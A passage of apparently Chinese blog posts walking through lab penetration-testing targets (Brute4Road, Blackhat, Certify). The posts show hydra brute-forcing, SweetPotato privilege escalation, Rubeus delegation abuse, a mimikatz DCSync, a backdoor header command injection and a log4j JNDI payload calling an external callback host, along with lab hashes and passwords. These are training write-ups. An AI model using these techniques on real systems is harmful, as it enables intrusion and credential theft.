src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road2.png\"></p>\n<p>flag2在数据库里</p>\n<h1 id=\"FLAG3\"><a href=\"#FLAG3\" class=\"headerlink\" title=\"FLAG3\"></a>FLAG3</h1><p>在另一张表里有很多密码</p>\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road3.png\"></p>\n<p>是172.22.2.16 msssql数据库的密码本，然后动手爆破，mssql的默认用户名是<code>sa</code>，因为导出来的有空格，所以把前面的空格处理掉</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─# grep -P &quot;\\w+&quot; pass -o &gt;2</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─# hydra -l sa -P pass 172.22.2.16 mssql -f -I -vV</span><br><span class=\"line\">[1433][mssql] host: 172.22.2.16   login: sa   password: ElGNkOiC</span><br></pre></td></tr></table></figure>\n\n<p>然后用MDUT连接</p>\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road4.png\"></p>\n<p>上传<a href=\"https://github.com/uknowsec/SweetPotato?tab=readme-ov-file\">sweetpotato.exe</a>然后提权</p>\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road5.png\"></p>\n<p>flag03在C:\\Users\\Administrator\\flag\\下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:/Users/MSSQLSERVER/Desktop/SweetPotato.exe -a &quot;type C:\\Users\\Administrator\\flag\\flag03.txt&quot;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"FLAG4\"><a href=\"#FLAG4\" class=\"headerlink\" title=\"FLAG4\"></a>FLAG4</h1><p>netstat -ano发现开启了3389</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4</span><br><span class=\"line\"></span><br><span class=\"line\">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       692</span><br><span class=\"line\"></span><br><span class=\"line\">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4</span><br><span class=\"line\"></span><br><span class=\"line\">  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       2680</span><br><span class=\"line\"></span><br><span class=\"line\">  TCP    0.0.0.0:2383           0.0.0.0:0              LISTENING       2932</span><br><span class=\"line\"></span><br><span class=\"line\">  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       812</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>添加一个用户</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:/Users/MSSQLSERVER/Desktop/SweetPotato.exe -a &quot;net user lv Asd123123 /add&quot;</span><br><span class=\"line\">C:/Users/MSSQLSERVER/Desktop/SweetPotato.exe -a &quot;net localgroup administrators lv /add&quot;</span><br></pre></td></tr></table></figure>\n\n<p>然后远程桌面登录</p>\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road6.png\"></p>\n<p>可以发现有域环境，先上传mimikatz提取hash，上传bloodhound可以发现有约束性委派</p>\n<p>获取到域用户的哈希为cea3e66a2715c71423e7d3f0ff6cd352</p>\n<p>通过Rubeus申请机器账户MSSQLSERVER的TGT，执行后，将得到 Base64 加密后的 TGT 票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:cea3e66a2715c71423e7d3f0ff6cd352 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap</span><br></pre></td></tr></table></figure>\n\n<p>然后使用 S4U2Self 扩展代表域管理员 Administrator 请求针对域控 LDAP 服务的票据，并将得到的票据传递到内存中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:[base64(ticket.kirbi)]</span><br></pre></td></tr></table></figure>\n\n<p>LDAP服务具有DCSync权限，可以导出域内用户哈希</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mimikatz.exe &quot;lsadump::dcsync /domain:xiaorang.lab /user:Administrator&quot; exit</span><br></pre></td></tr></table></figure>\n\n<p>得到域管的哈希为1a19251fbd935969832616366ae3fe62</p>\n<p>然后就可以用WMI服务登录域控，flag在C:\\Users\\Administrator\\flag下</p>\n","categories":["春秋云镜"],"tags":["靶机"]},{"title":"HackmyVM-Blackhat","url":"/2025/04/17/Hackmyvm-Blackhat/","content":"<h1 id=\"信息搜集\"><a href=\"#信息搜集\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h1><p>arp-scan -l扫描</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# arp-scan -l</span><br><span class=\"line\">Interface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129</span><br><span class=\"line\">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class=\"line\">192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)</span><br><span class=\"line\">192.168.31.2    08:00:27:73:b2:7a       PCS Systemtechnik GmbH</span><br><span class=\"line\">192.168.31.140  08:00:27:19:a9:32       PCS Systemtechnik GmbH</span><br></pre></td></tr></table></figure>\n\n<p>192.168.31.140是靶机地址</p>\n<p>然后扫描端口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# nmap 192.168.31.140</span><br><span class=\"line\">Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-17 00:16 EDT</span><br><span class=\"line\">Nmap scan report for 192.168.31.140</span><br><span class=\"line\">Host is up (0.0019s latency).</span><br><span class=\"line\">Not shown: 999 closed tcp ports (reset)</span><br><span class=\"line\">PORT   STATE SERVICE</span><br><span class=\"line\">80/tcp open  http</span><br><span class=\"line\">MAC Address: 08:00:27:19:A9:32 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 6.85 seconds</span><br></pre></td></tr></table></figure>\n\n<p>只开了一个80端口，扫描一下目录可以扫描到一个phpinfo.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Loaded Modules\tcore mod_so mod_watchdog http_core mod_log_config mod_logio mod_version mod_unixd mod_access_compat mod_alias mod_auth_basic mod_authn_core mod_authn_file mod_authz_core mod_authz_host mod_authz_user mod_autoindex mod_backdoor mod_deflate mod_dir mod_env mod_filter mod_mime prefork mod_negotiation mod_php7 mod_reqtimeout mod_setenvif mod_status</span><br></pre></td></tr></table></figure>\n\n<p>mod_backdoor 存在漏洞</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# curl 192.168.31.140 -H &quot;Backdoor: id&quot;</span><br><span class=\"line\">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>\n\n<p>反弹一个shell出来，上传 linpeas.sh ，运行看结果</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">╔══════════╣ Files with ACLs (limited to 50)</span><br><span class=\"line\">╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls</span><br><span class=\"line\"># file: /etc/sudoers</span><br><span class=\"line\">USER   root       r--</span><br><span class=\"line\">user   darkdante  rw-</span><br><span class=\"line\">GROUP  root       r--</span><br><span class=\"line\">mask              rw-</span><br><span class=\"line\">other             ---</span><br></pre></td></tr></table></figure>\n\n<p>可以看到sudoers文件darkdante有写的权限，darkdante直接su就登录了哈哈哈哈哈</p>\n<p>写入sudoers文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">darkdante ALL=(ALL:ALL) ALL</span><br></pre></td></tr></table></figure>\n\n<p>然后sudo su，提权成功</p>\n","categories":["HackMyVM"],"tags":["靶机"]},{"title":"春秋云镜-Certify","url":"/2025/04/16/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify/","content":"<h1 id=\"FLAG1\"><a href=\"#FLAG1\" class=\"headerlink\" title=\"FLAG1\"></a>FLAG1</h1><p>先用fscan扫一扫</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# ../pentest/fscan/fscan2 -h 39.99.135.211</span><br><span class=\"line\">┌──────────────────────────────────────────────┐</span><br><span class=\"line\">│    ___                              _        │</span><br><span class=\"line\">│   / _ \\     ___  ___ _ __ __ _  ___| | __    │</span><br><span class=\"line\">│  / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class=\"line\">│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   &lt;     │</span><br><span class=\"line\">│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │</span><br><span class=\"line\">└──────────────────────────────────────────────┘</span><br><span class=\"line\">      Fscan Version: 2.0.0</span><br><span class=\"line\"></span><br><span class=\"line\">[2025-04-16 11:59:40] [INFO] 暴力破解线程数: 1</span><br><span class=\"line\">[2025-04-16 11:59:40] [INFO] 开始信息扫描</span><br><span class=\"line\">[2025-04-16 11:59:40] [INFO] 最终有效主机数量: 1</span><br><span class=\"line\">[2025-04-16 11:59:41] [INFO] 开始主机扫描</span><br><span class=\"line\">[2025-04-16 11:59:41] [INFO] 有效端口数量: 233</span><br><span class=\"line\">[2025-04-16 11:59:41] [SUCCESS] 端口开放 39.99.135.211:22</span><br><span class=\"line\">[2025-04-16 11:59:41] [SUCCESS] 端口开放 39.99.135.211:80</span><br><span class=\"line\">[2025-04-16 11:59:41] [SUCCESS] 服务识别 39.99.135.211:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class=\"line\">[2025-04-16 11:59:45] [SUCCESS] 端口开放 39.99.135.211:8983</span><br><span class=\"line\">[2025-04-16 11:59:46] [SUCCESS] 服务识别 39.99.135.211:80 =&gt; [http] 版本:1.18.0 产品:nginx 系统:Linux 信息:Ubuntu</span><br><span class=\"line\">[2025-04-16 11:59:55] [SUCCESS] 服务识别 39.99.135.211:8983 =&gt; [http] 产品:Apache Solr Banner:[HTTP/1.1 302 Found.Location: http://172.22.9.19:8983/solr/.]</span><br><span class=\"line\">[2025-04-16 11:59:55] [INFO] 存活端口数量: 3</span><br><span class=\"line\">[2025-04-16 11:59:55] [INFO] 开始漏洞扫描</span><br><span class=\"line\">[2025-04-16 11:59:55] [INFO] 加载的插件: ssh, webpoc, webtitle</span><br><span class=\"line\">[2025-04-16 11:59:55] [SUCCESS] 网站标题 http://39.99.135.211      状态码:200 长度:612    标题:Welcome to nginx!</span><br><span class=\"line\">[2025-04-16 11:59:56] [SUCCESS] 网站标题 http://39.99.135.211:8983 状态码:302 长度:0      标题:无标题 重定向地址: http://39.99.135.211:8983/solr/</span><br><span class=\"line\">[2025-04-16 11:59:57] [SUCCESS] 网站标题 http://39.99.135.211:8983/solr/ 状态码:200 长度:16555  标题:Solr Admin</span><br><span class=\"line\">[2025-04-16 12:00:04] [SUCCESS] 扫描已完成: 5/5</span><br></pre></td></tr></table></figure>\n\n<p>39.99.135.211:8983是一个solr面板，存在log4j漏洞</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://39.99.135.211:8983/solr/admin/cores?action=$&#123;jndi:ldap://tc94uide908k5qcv0xurpcoorfx6lw9l.oastify.com&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify1.png\"></p>\n<p>上vps，可以利用<a href=\"https://github.com/vulhub/java-chains\">java-chains</a>反弹一个shell,反弹的shell如果不舒服可以写一个公钥进去</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">solr@ubuntu:/opt/solr$ sudo -l</span><br><span class=\"line\">sudo -l</span><br><span class=\"line\">Matching Defaults entries for solr on ubuntu:</span><br><span class=\"line\">    env_reset, mail_badpass,</span><br><span class=\"line\">    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin</span><br><span class=\"line\"></span><br><span class=\"line\">User solr may run the following commands on ubuntu:</span><br><span class=\"line\">    (root) NOPASSWD: /usr/bin/gr</span><br></pre></td></tr></table></figure>\n\n<p>提权<code>sudo grc --pty /bin/sh</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">solr@ubuntu:~$ sudo grc --pty /bin/sh</span><br><span class=\"line\"># id</span><br><span class=\"line\">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>\n\n<p>提权到root后，写一个公钥进去，flag01在/root/flag下，然后上传一个fscan，再做一个代理</p>\n<h1 id=\"FLAG2\"><a href=\"#FLAG2\" class=\"headerlink\" title=\"FLAG2\"></a>FLAG2</h1><p>查看一下内网的ip端，开扫！</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@ubuntu:/tmp# ip a</span><br><span class=\"line\">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class=\"line\">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class=\"line\">    inet 127.0.0.1/8 scope host lo</span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br><span class=\"line\">    inet6 ::1/128 scope host</span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br><span class=\"line\">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class=\"line\">    link/ether 00:16:3e:26:2b:c3 brd ff:ff:ff:ff:ff:ff</span><br><span class=\"line\">    inet 172.22.9.19/16 brd 172.22.255.255 scope global dynamic eth0</span><br><span class=\"line\">       valid_lft 315357456sec preferred_lft 315357456sec</span><br><span class=\"line\">    inet6 fe80::216:3eff:fe26:2bc3/64 scope link</span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@ubuntu:/tmp# ./fscan2 -h 172.22.9.19/24</span><br><span class=\"line\">┌──────────────────────────────────────────────┐</span><br><span class=\"line\">│    ___                              _        │</span><br><span class=\"line\">│   / _ \\     ___  ___ _ __ __ _  ___| | __    │</span><br><span class=\"line\">│  / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class=\"line\">│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   &lt;     │</span><br><span class=\"line\">│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │</span><br><span class=\"line\">└──────────────────────────────────────────────┘</span><br><span class=\"line\">      Fscan Version: 2.0.0</span><br><span class=\"line\"></span><br><span class=\"line\">[2025-04-17 00:40:03] [INFO] 暴力破解线程数: 1</span><br><span class=\"line\">[2025-04-17 00:40:03] [INFO] 开始信息扫描</span><br><span class=\"line\">[2025-04-17 00:40:03] [INFO] CIDR范围: 172.22.9.0-172.22.9.255</span><br><span class=\"line\">[2025-04-17 00:40:03] [INFO] 生成IP范围: 172.22.9.0.%!d(string=172.22.9.255) - %!s(MISSING).%!d(MISSING)</span><br><span class=\"line\">[2025-04-17 00:40:03] [INFO] 解析CIDR 172.22.9.19/24 -&gt; IP范围 172.22.9.0-172.22.9.255</span><br><span class=\"line\">[2025-04-17 00:40:03] [INFO] 最终有效主机数量: 256</span><br><span class=\"line\">[2025-04-17 00:40:03] [INFO] 开始主机扫描</span><br><span class=\"line\">[2025-04-17 00:40:03] [SUCCESS] 目标 172.22.9.19     存活 (ICMP)</span><br><span class=\"line\">[2025-04-17 00:40:03] [SUCCESS] 目标 172.22.9.7      存活 (ICMP)</span><br><span class=\"line\">[2025-04-17 00:40:03] [SUCCESS] 目标 172.22.9.26     存活 (ICMP)</span><br><span class=\"line\">[2025-04-17 00:40:03] [SUCCESS] 目标 172.22.9.47     存活 (ICMP)</span><br><span class=\"line\">[2025-04-17 00:40:06] [INFO] 存活主机数量: 4</span><br><span class=\"line\">[2025-04-17 00:40:06] [INFO] 有效端口数量: 233</span><br><span class=\"line\">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.7:88</span><br><span class=\"line\">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.47:80</span><br><span class=\"line\">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.7:80</span><br><span class=\"line\">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.47:22</span><br><span class=\"line\">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.19:80</span><br><span class=\"line\">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.47:21</span><br><span class=\"line\">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.19:22</span><br><span class=\"line\">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.47:445</span><br><span class=\"line\">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.26:445</span><br><span class=\"line\">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.7:445</span><br><span class=\"line\">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.7:389</span><br><span class=\"line\">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.47:139</span><br><span class=\"line\">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.7:139</span><br><span class=\"line\">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.26:139</span><br><span class=\"line\">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.7:135</span><br><span class=\"line\">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.26:135</span><br><span class=\"line\">[2025-04-17 00:40:06] [SUCCESS] 服务识别 172.22.9.47:22 =&gt; [ssh] 版本:7.6p1 Ubuntu 4ubuntu0.7 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7.]</span><br><span class=\"line\">[2025-04-17 00:40:07] [SUCCESS] 服务识别 172.22.9.47:21 =&gt; [ftp] 版本:3.0.3 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.3).]</span><br><span class=\"line\">[2025-04-17 00:40:07] [SUCCESS] 服务识别 172.22.9.19:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class=\"line\">[2025-04-17 00:40:11] [SUCCESS] 服务识别 172.22.9.7:88 =&gt;</span><br><span class=\"line\">[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.19:80 =&gt; [http] 版本:1.18.0 产品:nginx 系统:Linux 信息:Ubuntu</span><br><span class=\"line\">[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.26:445 =&gt;</span><br><span class=\"line\">[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.7:80 =&gt; [http]</span><br><span class=\"line\">[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.7:445 =&gt;</span><br><span class=\"line\">[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.7:389 =&gt;</span><br><span class=\"line\">[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.7:139 =&gt;  Banner:[.]</span><br><span class=\"line\">[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.26:139 =&gt;  Banner:[.]</span><br><span class=\"line\">[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.47:80 =&gt; [http]</span><br><span class=\"line\">[2025-04-17 00:41:07] [SUCCESS] 服务识别 172.22.9.47:445 =&gt;</span><br><span class=\"line\">[2025-04-17 00:41:07] [SUCCESS] 服务识别 172.22.9.47:139 =&gt;</span><br><span class=\"line\">[2025-04-17 00:41:12] [SUCCESS] 服务识别 172.22.9.7:135 =&gt;</span><br><span class=\"line\">[2025-04-17 00:41:12] [SUCCESS] 服务识别 172.22.9.26:135 =&gt;</span><br><span class=\"line\">[2025-04-17 00:41:12] [INFO] 存活端口数量: 16</span><br><span class=\"line\">[2025-04-17 00:41:12] [INFO] 开始漏洞扫描</span><br><span class=\"line\">[2025-04-17 00:41:12] [INFO] 加载的插件: findnet, ftp, ldap, ms17010, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle</span><br><span class=\"line\">[2025-04-17 00:41:12] [SUCCESS] 网站标题 http://172.22.9.19        状态码:200 长度:612    标题:Welcome to nginx!</span><br><span class=\"line\">[2025-04-17 00:41:12] [SUCCESS] NetInfo 扫描结果</span><br><span class=\"line\">目标主机: 172.22.9.26</span><br><span class=\"line\">主机名: DESKTOP-CBKTVMO</span><br><span class=\"line\">发现的网络接口:</span><br><span class=\"line\">   IPv4地址:</span><br><span class=\"line\">      └─ 172.22.9.26</span><br><span class=\"line\">[2025-04-17 00:41:12] [SUCCESS] 网站标题 http://172.22.9.47        状态码:200 长度:10918  标题:Apache2 Ubuntu Default Page: It works</span><br><span class=\"line\">[2025-04-17 00:41:12] [SUCCESS] 网站标题 http://172.22.9.7         状态码:200 长度:703    标题:IIS Windows Server</span><br><span class=\"line\">[2025-04-17 00:41:12] [SUCCESS] NetBios 172.22.9.7      DC:XIAORANG\\XIAORANG-DC</span><br><span class=\"line\">[2025-04-17 00:41:12] [SUCCESS] NetInfo 扫描结果</span><br><span class=\"line\">目标主机: 172.22.9.7</span><br><span class=\"line\">主机名: XIAORANG-DC</span><br><span class=\"line\">发现的网络接口:</span><br><span class=\"line\">   IPv4地址:</span><br><span class=\"line\">      └─ 172.22.9.7</span><br><span class=\"line\">[2025-04-17 00:41:12] [SUCCESS] NetBios 172.22.9.26     DESKTOP-CBKTVMO.xiaorang.lab        Windows Server 2016 Datacenter 14393</span><br><span class=\"line\">[2025-04-17 00:41:12] [SUCCESS] SMB认证成功 172.22.9.47:445 administrator:123456</span><br><span class=\"line\">[2025-04-17 00:41:12] [INFO] 系统信息 172.22.9.47 [Windows 6.1]</span><br><span class=\"line\">[2025-04-17 00:41:12] [SUCCESS] NetBios 172.22.9.47     fileserver                          Windows 6.1</span><br><span class=\"line\">[2025-04-17 00:41:12] [INFO] SMB2共享信息 172.22.9.47:445 administrator Pass:123456 共享:[print$ fileshare IPC$]</span><br><span class=\"line\">[2025-04-17 00:41:12] [SUCCESS] 目标: http://172.22.9.7:80</span><br><span class=\"line\">  漏洞类型: poc-yaml-active-directory-certsrv-detect</span><br><span class=\"line\">  漏洞名称:</span><br><span class=\"line\">  详细信息:</span><br><span class=\"line\">        author:AgeloVito</span><br><span class=\"line\">        links:https://www.cnblogs.com/EasonJim/p/6859345.html</span><br></pre></td></tr></table></figure>\n\n<p>上来就扫到域控的漏洞了，但是现在还没有什么可用的信息没办法直接打。</p>\n<p>172.22.9.47:445 smb服务存在一个弱口令登陆一下看看</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# smbclient //172.22.9.47/fileshare -U administrator%123465</span><br><span class=\"line\">Try &quot;help&quot; to get a list of possible commands.</span><br><span class=\"line\">smb: \\&gt; ls</span><br><span class=\"line\">  .                                   D        0  Wed Jul 13 04:12:10 2022</span><br><span class=\"line\">  ..                                  D        0  Wed Jul 13 00:35:09 2022</span><br><span class=\"line\">  personnel.db                        A    61440  Wed Jul 13 03:46:55 2022</span><br><span class=\"line\">  secret                              D        0  Wed Apr 16 11:57:06 2025</span><br><span class=\"line\">  Certified_Pre-Owned.7z              N  9572925  Wed Jul 13 04:12:03 2022</span><br><span class=\"line\">  Certified_Pre-Owned.pdf             N 10406101  Wed Jul 13 04:08:14 2022</span><br><span class=\"line\"></span><br><span class=\"line\">                41152812 blocks of size 1024. 36033208 blocks available</span><br><span class=\"line\">smb: \\&gt; cd ..</span><br><span class=\"line\">smb: \\&gt; ls</span><br><span class=\"line\">  .                                   D        0  Wed Jul 13 04:12:10 2022</span><br><span class=\"line\">  ..                                  D        0  Wed Jul 13 00:35:09 2022</span><br><span class=\"line\">  personnel.db                        A    61440  Wed Jul 13 03:46:55 2022</span><br><span class=\"line\">  secret                              D        0  Wed Apr 16 11:57:06 2025</span><br><span class=\"line\">  Certified_Pre-Owned.7z              N  9572925  Wed Jul 13 04:12:03 2022</span><br><span class=\"line\">  Certified_Pre-Owned.pdf             N 10406101  Wed Jul 13 04:08:14 2022</span><br><span class=\"line\"></span><br><span class=\"line\">                41152812 blocks of size 1024. 36033208 blocks available</span><br><span class=\"line\">smb: \\&gt; cd secret</span><br><span class=\"line\">smb: \\secret\\&gt; ls</span><br><span class=\"line\">  .                                   D        0  Wed Apr 16 11:57:06 2025</span><br><span class=\"line\">  ..                                  D        0  Wed Jul 13 04:12:10 2022</span><br><span class=\"line\">  flag02.txt                          N      659  Wed Apr 16 11:57:06 2025</span><br><span class=\"line\"></span><br><span class=\"line\">                41152812 blocks of size 1024. 36033208 blocks available</span><br></pre></td></tr></table></figure>\n\n<p>找到flag02了</p>\n<h1 id=\"FLAG3-amp-FLAG4\"><a href=\"#FLAG3-amp-FLAG4\" class=\"headerlink\" title=\"FLAG3&amp;FLAG4\"></a>FLAG3&amp;FLAG4</h1><p>flag02.txt里还给了一个提示</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Yes, you have enumerated smb. But do you know what an SPN is?</span><br></pre></td></tr></table></figure>\n\n<p>把所有文件都下载下来看一看,</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sqlite&gt; select * from xr_users ;</span><br><span class=\"line\">1|admin|admin</span><br><span class=\"line\">2|******|i9XDE02pLVf</span><br><span class=\"line\">3|******|6N70jt2K9sV</span><br><span class=\"line\">4|******|fiAzGwEMgTY</span><br><span class=\"line\">sqlite&gt; select * from xr_members ;</span><br><span class=\"line\">1|huangmin|1|26|15220647319|huangmin@xiaorang.lab</span><br><span class=\"line\">2|zhangrong|1|36|13073815024|zhangrong@xiaorang.lab</span><br><span class=\"line\">3|liying|1|29|13126874319|liying@xiaorang.lab</span><br><span class=\"line\">4|zhaoli|1|44|13075613024|zhaoli@xiaorang.lab</span><br><span class=\"line\">5|zhangyan|0|35|15254139260|zhangyan@xiaorang.lab</span><br><span class=\"line\">6|zhoujing|1|32|15123481906|zhoujing@xiaorang.lab</span><br><span class=\"line\">7|liuying|1|24|13078310649|liuying@xiaorang.lab</span><br><span class=\"line\">.......</span><br></pre></td></tr></table></figure>\n\n<p> personnel.db里面有用户和3个不知道用户名的密码，先将数据处理一下吧，将xr_users和xr_members的内容分别保存到pass和user里</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# cat pass|awk -F&#x27;|&#x27; &#x27;&#123;print($3)&#125;&#x27;&gt;pass.txt</span><br><span class=\"line\"></span><br><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# cat pass.txt</span><br><span class=\"line\">admin</span><br><span class=\"line\">i9XDE02pLVf</span><br><span class=\"line\">6N70jt2K9sV</span><br><span class=\"line\">fiAzGwEMgTY</span><br><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# cat user|awk -F&#x27;|&#x27; &#x27;&#123;print($2)&#125;&#x27; &gt;username.txt</span><br><span class=\"line\"></span><br><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# cat username.txt</span><br><span class=\"line\">huangmin</span><br><span class=\"line\">zhangrong</span><br><span class=\"line\">liying</span><br><span class=\"line\">zhaoli</span><br><span class=\"line\">zhangyan</span><br><span class=\"line\">zhoujing</span><br><span class=\"line\">liuying</span><br><span class=\"line\">wanghao</span><br><span class=\"line\">wangqiang</span><br><span class=\"line\">wanglu</span><br><span class=\"line\">zhaoyong</span><br><span class=\"line\">zhangli</span><br><span class=\"line\">wangning</span><br><span class=\"line\">wangyu</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p>用hydra爆破，可以爆破出来两个用户</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span 